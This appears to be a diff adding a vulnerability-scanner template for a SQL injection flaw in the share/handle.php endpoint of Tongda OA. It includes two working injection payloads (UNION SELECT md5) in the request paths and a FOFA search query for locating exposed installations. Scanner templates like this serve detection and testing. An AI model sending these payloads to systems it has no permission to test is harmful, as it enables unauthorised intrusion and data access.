@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - condition: and
+          type: word
+          words:
+            - '{{md5({{num}})}}'
+            - '"status":"1"'
+            - share_id=
+            - '"img_url":"'
+      method: GET
+      path:
+        - '{{BaseURL}}/share/handle.php?_GET[module]=1''+and+1={`=''`+1}+and+1=0+union+select+(select/**/md5({{num}}))--+'''
+        - '{{BaseURL}}/share/handle.php?_GET[module]=1%27+and+1=%7B%60=%27%60+1%7D+and+1=0+union+select+(select/**/md5({{num}}))--+%27'
+      stop-at-first-match: true
+id: tongda-oa-share-handle-php-sqli
+info:
+    author: wuha
+    metadata:
+        fofa-query: app="TDXK-通达OA"
+        veified: true
+    name: tongda-oa-share-handle-php-sqli
+    severity: high
+    tags:
+        - tongda
+        - tongdaoa
+        - 通达oa
+        - TDXK-通达OA
+variables:
+    num: '{{rand_int(100000,999999)}}'
